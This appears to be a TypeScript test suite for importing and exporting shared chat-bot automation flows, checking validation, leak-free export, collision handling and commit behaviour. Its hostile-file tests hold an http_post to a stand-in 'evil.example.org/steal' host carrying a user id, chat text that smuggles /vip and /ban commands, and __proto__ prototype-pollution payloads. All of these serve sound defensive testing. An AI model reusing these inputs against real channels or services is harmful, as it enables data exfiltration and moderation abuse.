// Copyright (c) 2026 Adam Ousmer. All rights reserved.
// Proprietary. No license granted. See LICENSE.md.

import { describe, expect, test } from 'bun:test';
import { readdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  commitFlowImport,
  exportFlows,
  flowImportView,
  FLOW_FILE_FORMAT,
  FLOW_FILE_VERSION,
  planFlowImport,
  serializeFlowFile,
  SETUP_LOGIN,
  SETUP_REWARD_ID,
  type FlowCommitDeps,
  type FlowExportRow,
  type FlowImportContext,
  type FlowImportEntry,
  type FlowWrite
} from './flow-share';
import { classifyFlow } from './flow-layer';
import { MAX_AUTOMATIONS_PER_CHANNEL, MAX_FLOWS_PER_FILE, MAX_FLOW_FILE_BYTES, MAX_NAME_LENGTH } from './limits';
import type { Definition } from './types';

const GOLDENS = join(import.meta.dir, 'testdata/flow-share');
const FIXTURES = join(import.meta.dir, '../../../../internal/domain/automation/testdata/valid');

type FileText = { text: string };

function golden({ file, actual }: { file: string; actual: string }): string {
  if (process.env.UPDATE_FLOW_SHARE_GOLDENS === '1') writeFileSync(join(GOLDENS, file), actual);
  return readFileSync(join(GOLDENS, file), 'utf8');
}

const EMPTY: FlowImportContext = { count: 0, names: [], commands: [], alerts: [] };
const chat = (text: string) => ({ type: 'chat', params: { text } });
const run = (automation_id: string) => ({ type: 'run', params: { automation_id } });
const manual = (actions: Definition['actions'] = [chat('hi')]): Definition => ({ version: 1, trigger: { type: 'manual', params: {} }, actions });
const command = (name: string, actions: Definition['actions'] = [chat('hi')]): Definition => ({
  version: 1,
  trigger: { type: 'command', params: { name } },
  actions
});

const alertLike = ({ kind, text }: { kind: string; text: string }): Definition => ({ version: 1, trigger: { type: 'event', params: { kind } }, actions: [chat(text)] });

const SHOWCASE: FlowExportRow[] = [
  {
    id: '11111111-aaaa-4bbb-8ccc-000000000001',
    name: '  Hype redeem  ',
    definition: {
      version: 1,
      trigger: { type: 'reward', params: { reward_id: '7e0f9a58-real-reward-id' } },
      conditions: [{ type: 'users', params: { allow: ['realviewer'], deny: ['realtroll'] } }],
      actions: [
        chat('{user} redeemed, deaths at {counter:deaths}, {urlfetch:weather}'),
        { type: 'http_post', params: { url: 'https://hooks.example.org/secret-token', body: 'key=hunter2' } },
        {
          type: 'lights',
          params: {
            device: 'AB:CD:EF:01:23:45:67:89',
            sku: 'H6159',
            device_name: 'Desk strip',
            mode: 'scene',
            scene_id: 'lightScene:4280:3853',
            scene_name: 'Sunrise',
            scene_type: 'devices.capabilities.dynamic_scene',
            scene_instance: 'lightScene',
            scene_value: '{"paramId":4280,"id":3853}'
          }
        },
        run('11111111-aaaa-4bbb-8ccc-000000000002'),
        run('99999999-not-exported'),
        { type: 'counter_add', params: { name: 'deaths', amount: 1 } }
      ]
    }
  },
  {
    id: '11111111-aaaa-4bbb-8ccc-000000000002',
    name: 'Mod helper',
    definition: {
      version: 1,
      trigger: { type: 'event', params: { kind: 'channel.follow', filters: { user_id: '555000111' } } },
      actions: [
        {
          type: 'if',
          params: {
            condition: { type: 'users', params: { deny: ['realtroll'] } },
            then: [
              { type: 'points_add', params: { login: 'realfriend', amount: 500 } },
              { type: 'shoutout', params: { login: '{user}' } }
            ],
            else: [chat('/mod realfriend'), run('11111111-aaaa-4bbb-8ccc-000000000001')]
          }
        }
      ]
    }
  }
];

const asFile = (flows: unknown[], extra: Record<string, unknown> = {}): FileText => ({
  text: JSON.stringify({ format: FLOW_FILE_FORMAT, version: FLOW_FILE_VERSION, flows, ...extra })
});
const entry = (ref: string, name: string, definition: unknown = manual()) => ({ ref, name, definition });

function planned(file: FileText, context = EMPTY, selected?: number[]): FlowImportEntry[] {
  const plan = planFlowImport(file.text, context, selected);
  if (!plan.ok) throw new Error(JSON.stringify(plan.issues));
  return plan.entries;
}

const onlyEntry = (definition: unknown) => planned(asFile([entry('f1', 'one', definition)]))[0]!;
const issueCodes = (e: FlowImportEntry) => e.issues.map((i) => i.code);
const noteCodes = (e: FlowImportEntry) => e.setup.map((n) => n.code);

function fileIssues(file: FileText): string[] {
  const plan = planFlowImport(file.text, EMPTY);
  return plan.ok ? [] : plan.issues.map((i) => i.code);
}

function recorder(failNames: string[] = [], failUpdates = false) {
  const writes: FlowWrite[] = [];
  let next = 0;
  const deps: FlowCommitDeps = {
    write: async (input) => {
      writes.push(input);
      if (failNames.includes(input.name)) return { ok: false, issues: [{ path: 'name', code: 'duplicate' }] };
      if (input.id && failUpdates) throw new Error('rpc');
      return input.id ? { ok: true, id: input.id, revision: (input.expectedRevision ?? 0) + 1 } : { ok: true, id: `new-${++next}`, revision: 1 };
    },
    preview: (definition, name) => `regen:${name}:${(definition.actions ?? []).length}`
  };
  return { writes, deps };
}

describe('exportFlows', () => {
  const { file, report } = exportFlows(SHOWCASE);
  const text = serializeFlowFile(file);

  test('produces the committed bytes', () => {
    expect(text).toBe(golden({ file: 'export.golden.json', actual: text }));
  });

  test('carries no channel ids, secrets, or row data', () => {
    for (const leak of ['7e0f9a58', 'realviewer', 'realtroll', 'realfriend', '123456789012345678', 'hunter2', 'secret-token', 'AB:CD:EF', 'H6159', 'Desk strip', 'Sunrise', '4280', 'my-secret-hook', '555000111', '11111111-aaaa', '99999999']) {
      expect(text).not.toContain(leak);
    }
    for (const field of ['user_id"', 'revision', 'created_at', 'updated_at', 'preview', '"id"', 'uses']) {
      expect(text.replace('"user_id": "setup-required"', '')).not.toContain(field);
    }
  });

  test('links runs inside the selection and marks the rest', () => {
    const [first] = file.flows;
    const runs = first!.definition.actions!.filter((a) => a.type === 'run');
    expect(runs).toEqual([run('f2'), { type: 'run', enabled: false, params: { automation_id: 'setup-required' } }]);
  });

  test('reports what the exporter should know about', () => {
    expect(report[0]!.setup.map((n) => n.code)).toEqual(
      expect.arrayContaining(['reward_trigger', 'users_list', 'http_target', 'lights_target', 'run_removed', 'counter', 'fetch'])
    );
    expect(report.every((r) => r.issues.length === 0)).toBe(true);
  });

  test('a stored row that no longer validates is left out and reported', () => {
    const out = exportFlows([{ name: 'broken', definition: { version: 99, trigger: { type: 'manual' } } }]);
    expect(out.file.flows).toEqual([]);
    expect(out.report[0]!.issues.map((i) => i.code)).toEqual(['unsupported_version']);
  });
});

describe('planFlowImport round trip', () => {
  const text: FileText = { text: serializeFlowFile(exportFlows(SHOWCASE).file) };

  test('previews to the committed report', () => {
    const view = `${JSON.stringify(planned(text).map(flowImportView), null, 2)}\n`;
    expect(view).toBe(golden({ file: 'import-preview.golden.json', actual: view }));
  });

  async function imported(file: FileText): Promise<FlowExportRow[]> {
    const { writes, deps } = recorder();
    const results = await commitFlowImport(planned(file), deps);
    const latest = new Map<string, FlowWrite>();
    let created = 0;
    for (const write of writes) latest.set(write.id ?? `new-${++created}`, write);
    return results.map((r) => ({ id: r.id, name: r.name, definition: latest.get(r.id!)!.definition }));
  }

  test('a re-export of an import is stable and matches the committed bytes', async () => {
    const second = serializeFlowFile(exportFlows(await imported(text)).file);
    expect(second).toBe(golden({ file: 'reexport.golden.json', actual: second }));
    const third = serializeFlowFile(exportFlows(await imported({ text: second })).file);
    expect(third).toBe(second);
  });

  test('links inside the selection stay linked through the round trip', async () => {
    const rows = await imported(text);
    const runs = exportFlows(rows).file.flows[0]!.definition.actions!.filter((a) => a.type === 'run');
    expect(runs).toEqual([run('f2')]);
  });

  test('every valid shared fixture is importable', () => {
    for (const name of readdirSync(FIXTURES).filter((f) => f.endsWith('.json') && !f.endsWith('.issues.json'))) {
      const definition = JSON.parse(readFileSync(join(FIXTURES, name), 'utf8'));
      const result = onlyEntry(definition);
      const allowed = result.issues.every((i) => i.code === 'uses_token');
      expect({ name, allowed, status: result.status === 'invalid' ? allowed : true }).toEqual({ name, allowed: true, status: true });
    }
  });
});

describe('file-level refusals', () => {
  test('over the byte cap', () => {
    expect(fileIssues({ text: ' '.repeat(MAX_FLOW_FILE_BYTES + 1) })).toEqual(['file_too_large']);
  });

  test('over the recipe cap', () => {
    const flows = Array.from({ length: MAX_FLOWS_PER_FILE + 1 }, (_, i) => entry(`f${i + 1}`, `r${i}`));
    expect(fileIssues(asFile(flows))).toEqual(['too_many']);
  });

  test('broken json, wrong shape, unknown format and version, extra top-level fields', () => {
    expect(fileIssues({ text: '{nope' })).toEqual(['invalid_json']);
    expect(fileIssues({ text: '[]' })).toEqual(['invalid_format']);
    expect(fileIssues({ text: JSON.stringify({ format: 'other', version: 1, flows: [] }) })).toEqual(['unknown_format']);
    expect(fileIssues({ text: JSON.stringify({ format: FLOW_FILE_FORMAT, version: 2, flows: [] }) })).toEqual(['unsupported_version']);
    expect(fileIssues(asFile([], { user_id: 7 }))).toEqual(['unknown_field']);
    expect(fileIssues(asFile([]))).toEqual(['required']);
  });
});

describe('per-recipe refusals', () => {
  test('one bad recipe does not stop the others', () => {
    const [good, bad] = planned(asFile([entry('f1', 'good'), entry('f2', 'bad', { version: 1, trigger: { type: 'teleport' } })]));
    expect(good!.status).toBe('ready');
    expect(bad!.status).toBe('invalid');
    expect(bad!.issues).toEqual([{ path: 'definition.trigger.type', code: 'unknown_type' }]);
  });

  test('unknown step types and future definition versions', () => {
    expect(issueCodes(onlyEntry(manual([{ type: 'launch_rocket' }])))).toEqual(['unknown_type']);
    expect(issueCodes(onlyEntry({ ...manual(), version: 2 }))).toEqual(['unsupported_version']);
  });

  test('row fields smuggled onto a recipe are refused', () => {
    for (const field of ['id', 'user_id', 'revision', 'enabled', 'preview', 'created_at']) {
      const [one] = planned(asFile([{ ...entry('f1', 'x'), [field]: 'x' }]));
      expect(one!.issues).toEqual([{ path: field, code: 'unknown_field' }]);
    }
  });

  test('prototype keys and field-case tricks cannot pass or crash validation', () => {
    const payloads = [
      '{"version":1,"trigger":{"type":"manual","__proto__":{"x":1}}}',
      '{"version":1,"trigger":{"type":"manual"},"constructor":1}',
      '{"version":1,"trigger":{"type":"manual"},"actions":[{"type":"http_post","params":{"URL":"https://example.org/x","body":"x"}}]}',
      '{"VERSION":1,"trigger":{"type":"manual"}}',
      '{"version":1,"trigger":{"type":"manual"},"actions":[{"Type":"chat","params":{"text":"x"}}]}'
    ];
    for (const payload of payloads) {
      const text = `{"format":"${FLOW_FILE_FORMAT}","version":1,"flows":[{"ref":"f1","name":"x","definition":${payload}}]}`;
      expect(issueCodes(planned({ text })[0]!)).toEqual(['unknown_field']);
    }
  });

  test('nesting past the size limit is refused by size', () => {
    let deep: unknown = chat('x');
    for (let i = 0; i < 5000; i++) deep = { type: 'if', params: { then: [deep] } };
    expect(issueCodes(onlyEntry({ version: 1, trigger: { type: 'manual' }, actions: [deep] }))).toEqual(['too_long']);
  });

  test('non-object definitions and names are per-recipe issues', () => {
    const [noDefinition, noName, scalar] = planned(asFile([{ ref: 'f1', name: 'x' }, { ref: 'f2', definition: manual() }, 7]));
    expect(issueCodes(noDefinition!)).toEqual(['required']);
    expect(issueCodes(noName!)).toEqual(['required']);
    expect(issueCodes(scalar!)).toEqual(['invalid_format']);
  });

  test('a duplicate ref is an issue on the later recipe', () => {
    const [, second] = planned(asFile([entry('f1', 'a'), entry('f1', 'b')]));
    expect(second!.issues).toEqual([{ path: 'ref', code: 'duplicate' }]);
  });

  test('tokens that automations cannot fill are refused like a normal save', () => {
    expect(issueCodes(onlyEntry(command('!c', [chat('used {count} times'), chat('again')])))).toEqual(['uses_token']);
  });

  test('oversized definitions and bad names', () => {
    const long = manual(Array.from({ length: 20 }, () => chat('x'.repeat(2000))));
    expect(issueCodes(onlyEntry(long))).toEqual(['too_long']);
    expect(issueCodes(planned(asFile([entry('f1', 'x'.repeat(MAX_NAME_LENGTH + 1))]))[0]!)).toEqual(['too_long']);
  });
});

describe('references in a hostile file', () => {
  test('real looking resources never survive, whatever the file claims', () => {
    const hostile = onlyEntry({
      version: 1,
      trigger: { type: 'reward', params: { reward_id: 'someone-elses-reward' } },
      conditions: [{ type: 'users', params: { allow: ['attacker'] } }],
      actions: [
        { type: 'ban', params: { login: 'attacker' } },
        { type: 'http_post', params: { url: 'https://evil.example.org/steal', body: '{user.id}' } },
        chat('/vip attacker'),
        chat('{choice:hello,/ban victim}'),
        run('00000000-1111-4222-8333-444444444444')
      ]
    });
    const written = JSON.stringify(hostile.definition);
    for (const leak of ['someone-elses-reward', 'attacker"', 'evil.example.org', '123456789012345678', '00000000-1111']) expect(written).not.toContain(leak);
    expect(written).not.toContain('attacker');
    expect(written).not.toContain('victim');
    expect(hostile.setup).toContainEqual({ code: 'slash_command', path: 'actions[2].params.text', detail: '/vip' });
    expect(hostile.status).toBe('ready');
    expect(hostile.definition!.trigger.params).toEqual({ reward_id: SETUP_REWARD_ID });
    expect(hostile.definition!.conditions![0]!.params).toEqual({ allow: [SETUP_LOGIN] });
    expect(hostile.definition!.actions!.every((a) => a.enabled === false)).toBe(true);
    expect(hostile.definition!.actions!.some((a) => a.type === 'run')).toBe(false);
    expect(noteCodes(hostile)).toEqual(
      expect.arrayContaining(['reward_trigger', 'users_list', 'login_target', 'privileged_action', 'http_target', 'slash_command', 'run_removed'])
    );
  });

  test('template targets stay live, literal ones do not', () => {
    const one = onlyEntry(manual([{ type: 'shoutout', params: { login: '@{user}' } }, { type: 'shoutout', params: { login: 'x{user}' } }, { type: 'points_add', params: { amount: 5 } }]));
    expect(one.definition!.actions!.map((a) => a.enabled)).toEqual([undefined, false, undefined]);
    expect(one.definition!.actions![1]!.params!.login).toBe(SETUP_LOGIN);
  });

  test('nested steps are rewritten too', () => {
    const one = onlyEntry(
      manual([
        {
          type: 'random_pick',
          params: {
            branches: [
              { weight: 1, actions: [{ type: 'http_post', params: { url: 'https://evil.example.org/x' } }] },
              { weight: 1, actions: [run('gone')] }
            ]
          }
        }
      ])
    );
    const written = JSON.stringify(one.definition);
    expect(written).not.toContain('evil.example.org');
    expect(written).not.toContain('gone');
    expect(noteCodes(one)).toEqual(expect.arrayContaining(['http_target', 'run_removed']));
  });

  test('event filters that name a viewer or reward fail closed, others stay', () => {
    const one = onlyEntry({
      version: 1,
      trigger: { type: 'event', params: { kind: 'channel.cheer', filters: { login: 'someone', amount: '100' } } },
      actions: [chat('x')]
    });
    expect((one.definition!.trigger.params as { filters: unknown }).filters).toEqual({ login: 'setup-required', amount: '100' });
  });

  test('counters stay by name and are called out', () => {
    const one = onlyEntry(manual([{ type: 'counter_set', params: { name: 'deaths', value: 0 } }]));
    expect(one.setup.map((n) => [n.code, n.detail])).toEqual(expect.arrayContaining([['counter', 'deaths']]));
  });
});

describe('collisions and capacity', () => {
  test('names never collide: existing, inside the file, any case', () => {
    const entries = planned(asFile([entry('f1', 'Hello'), entry('f2', 'hello'), entry('f3', 'other')]), { ...EMPTY, names: ['HELLO'] });
    expect(entries.map((e) => [e.name, e.renamed])).toEqual([
      ['Hello (2)', true],
      ['hello (3)', true],
      ['other', false]
    ]);
  });

  test('a rename still fits the name limit', () => {
    const long = 'n'.repeat(MAX_NAME_LENGTH);
    const [one] = planned(asFile([entry('f1', long)]), { ...EMPTY, names: [long] });
    expect([...one!.name].length).toBe(MAX_NAME_LENGTH);
    expect(one!.name.endsWith(' (2)')).toBe(true);
  });

  test('an automation on a command name already in use is reported', () => {
    const [one] = planned(asFile([entry('f1', 'x', command('!Hug', [chat('a'), chat('b')]))]), { ...EMPTY, commands: ['hug'] });
    expect(one!.landing).toBe('automation');
    expect(one!.setup).toContainEqual({ code: 'command_in_use', path: 'trigger.params.name', detail: 'hug' });
  });

  test('the channel cap stops new recipes, invalid ones take no slot', () => {
    const entries = planned(asFile([entry('f1', 'bad', {}), entry('f2', 'fits'), entry('f3', 'late')]), { ...EMPTY, count: MAX_AUTOMATIONS_PER_CHANNEL - 1 });
    expect(entries.map((e) => e.status)).toEqual(['invalid', 'ready', 'over_limit']);
    const full = planned(asFile([entry('f1', 'a')]), { ...EMPTY, count: MAX_AUTOMATIONS_PER_CHANNEL });
    expect(full.map((e) => e.status)).toEqual(['over_limit']);
  });

  test('unselected recipes are skipped and links to them drop', () => {
    const entries = planned(asFile([entry('f1', 'a', manual([run('f2')])), entry('f2', 'b')]), EMPTY, [0]);
    expect(entries.map((e) => e.status)).toEqual(['ready', 'skipped']);
    expect(noteCodes(entries[0]!)).toContain('run_removed');
    expect(entries[0]!.definition!.actions ?? []).toEqual([]);
  });
});

describe('where a recipe lands', () => {
  const follow = (text: string): Definition => ({ version: 1, trigger: { type: 'event', params: { kind: 'channel.follow' } }, actions: [chat(text)] });

  test('simple recipes land as commands and alerts, the rest as automations', () => {
    const entries = planned(asFile([entry('f1', 'Hug', command('!hug')), entry('f2', 'Hello', follow('hi {user}')), entry('f3', 'Big', command('!big', [chat('a'), chat('b')]))]));
    expect(entries.map((e) => [e.status, e.landing, e.target, e.name])).toEqual([
      ['ready', 'command', 'hug', '!hug'],
      ['ready', 'alert', 'follow', 'Hello'],
      ['ready', 'automation', undefined, 'Big']
    ]);
  });

  test('simple recipes take no automation slot', () => {
    const entries = planned(asFile([entry('f1', 'Hug', command('!hug')), entry('f2', 'Hello', follow('hi')), entry('f3', 'Big', manual())]), { ...EMPTY, count: MAX_AUTOMATIONS_PER_CHANNEL });
    expect(entries.map((e) => e.status)).toEqual(['ready', 'ready', 'over_limit']);
  });

  test('uses tokens are fine on a command, which has a use counter', () => {
    expect(onlyEntry(command('!c', [chat('used {count} times')])).landing).toBe('command');
  });

  test('a command name in use is a conflict, not a rename, including aliases and inside the file', () => {
    const aliased = { ...command('!new'), trigger: { type: 'command', params: { name: '!new', aliases: ['!Hug'] } } };
    const entries = planned(asFile([entry('f1', 'a', command('!HUG')), entry('f2', 'b', aliased), entry('f3', 'c', command('!free')), entry('f4', 'd', command('!free'))]), { ...EMPTY, commands: ['hug'] });
    expect(entries.map((e) => e.status)).toEqual(['conflict', 'conflict', 'ready', 'conflict']);
    expect(entries[0]!.issues).toEqual([{ path: 'trigger.params.name', code: 'command_exists' }]);
    expect(entries[0]!.definition).toBeUndefined();
  });

  test('a taken alert is a conflict and is never written, and alerts are single inside a file', async () => {
    const entries = planned(asFile([entry('f1', 'a', follow('one')), entry('f2', 'b', alertLike({ kind: 'channel.raid', text: 'x' })), entry('f3', 'c', alertLike({ kind: 'channel.raid', text: 'y' }))]), { ...EMPTY, alerts: ['follow'] });
    expect(entries.map((e) => [e.status, e.target])).toEqual([
      ['conflict', 'follow'],
      ['ready', 'raid'],
      ['conflict', 'raid']
    ]);
    expect(entries[0]!.issues).toEqual([{ path: 'trigger', code: 'alert_exists' }]);
    const { writes, deps } = recorder();
    const results = await commitFlowImport(entries, deps);
    expect(writes.map((w) => w.name)).toEqual(['b']);
    expect(results.map((r) => r.status)).toEqual(['conflict', 'created', 'conflict']);
  });

  test('a run cannot point at a command or alert, so the step drops with its own note', () => {
    const entries = planned(asFile([entry('f1', 'a', manual([chat('x'), run('f2')])), entry('f2', 'b', command('!b'))]));
    expect(entries[1]!.landing).toBe('command');
    expect(entries[0]!.definition!.actions).toEqual([chat('x')]);
    expect(noteCodes(entries[0]!)).toContain('run_target_simple');
  });

  test('dropping a dead run can turn its owner simple, and that settles through chains', () => {
    const entries = planned(asFile([entry('f1', 'a', command('!a', [chat('x'), run('f2')])), entry('f2', 'b', command('!b', [chat('y'), run('f3')])), entry('f3', 'c', command('!c'))]));
    expect(entries.map((e) => e.landing)).toEqual(['command', 'command', 'command']);
    expect(entries.every((e) => e.definition!.actions!.length === 1)).toBe(true);
  });

  test('a run kept for the second pass cannot make the first write look simple', async () => {
    const { writes, deps } = recorder();
    await commitFlowImport(planned(asFile([entry('f1', 'a', command('!a', [chat('x'), run('f2')])), entry('f2', 'b', manual())])), deps);
    expect(classifyFlow(writes[0]!.definition).layer).toBe('automation');
  });

  test('a link lost in the second pass reports the layer the flow moved to', async () => {
    const { deps } = recorder(['b']);
    const moved: FlowCommitDeps = { ...deps, write: async (input) => (input.id ? { ok: true } : deps.write(input)) };
    const entries = planned(asFile([entry('f1', 'a', command('!a', [chat('x'), run('f2')])), entry('f2', 'b', manual())]));
    const [first] = await commitFlowImport(entries, moved);
    expect([first!.status, first!.landing, first!.target, first!.id]).toEqual(['created', 'command', 'a', undefined]);
    expect(first!.setup.map((n) => n.code)).toEqual(['run_removed']);
  });

  test('the result says where each one went', async () => {
    const { deps } = recorder();
    const noId: FlowCommitDeps = { ...deps, write: async () => ({ ok: true }) };
    const [one] = await commitFlowImport(planned(asFile([entry('f1', 'a', command('!a'))])), noId);
    expect([one!.status, one!.landing, one!.target, one!.id]).toEqual(['created', 'command', 'a', undefined]);
  });
});

describe('commitFlowImport', () => {
  test('everything arrives off, with no id on create, and preview comes from the final definition', async () => {
    const { writes, deps } = recorder();
    await commitFlowImport(planned(asFile([entry('f1', 'a')])), deps);
    expect(writes).toEqual([{ name: 'a', enabled: false, definition: { version: 1, trigger: { type: 'manual', params: {} }, actions: [chat('hi')] }, preview: 'regen:a:1' }]);
  });

  test('run links survive a cycle through a second pass', async () => {
    const { writes, deps } = recorder();
    const results = await commitFlowImport(planned(asFile([entry('f1', 'a', manual([run('f2')])), entry('f2', 'b', manual([run('f1')]))])), deps);
    expect(results.map((r) => [r.status, r.id])).toEqual([
      ['created', 'new-1'],
      ['created', 'new-2']
    ]);
    expect(writes.slice(0, 2).map((w) => w.definition.actions)).toEqual([[{ type: 'stop', enabled: false }], [{ type: 'stop', enabled: false }]]);
    expect(writes.slice(2).map((w) => [w.id, w.expectedRevision, w.enabled, w.definition.actions, w.preview])).toEqual([
      ['new-1', 1, false, [run('new-2')], 'regen:a:1'],
      ['new-2', 1, false, [run('new-1')], 'regen:b:1']
    ]);
  });

  test('partial success is reported per recipe and a failed target drops its links', async () => {
    const { writes, deps } = recorder(['b']);
    const results = await commitFlowImport(planned(asFile([entry('f1', 'a', manual([run('f2'), chat('x')])), entry('f2', 'b'), entry('f3', 'c', {})])), deps);
    expect(results.map((r) => r.status)).toEqual(['created', 'failed', 'invalid']);
    expect(results[1]!.issues).toEqual([{ path: 'name', code: 'duplicate' }]);
    expect(results[0]!.setup.map((n) => n.code)).toEqual(['run_removed']);
    expect(writes.at(-1)!.definition.actions).toEqual([chat('x')]);
  });

  test('a link write that fails keeps the recipe and says so', async () => {
    const { deps } = recorder([], true);
    const results = await commitFlowImport(planned(asFile([entry('f1', 'a', manual([run('f1')]))])), deps);
    expect(results[0]!.status).toBe('created');
    expect(results[0]!.setup.map((n) => n.code)).toEqual(['link_failed']);
  });

  test('a throwing writer or previewer fails one recipe, not the import', async () => {
    const deps: FlowCommitDeps = {
      write: async (input) => {
        if (input.name === 'a') throw new Error('rpc');
        return { ok: true, id: 'id', revision: 1 };
      },
      preview: () => {
        throw new Error('layout');
      }
    };
    const results = await commitFlowImport(planned(asFile([entry('f1', 'a'), entry('f2', 'b')])), deps);
    expect(results.map((r) => r.status)).toEqual(['failed', 'created']);
    expect(results[0]!.issues).toEqual([{ path: '', code: 'write_failed' }]);
  });
});
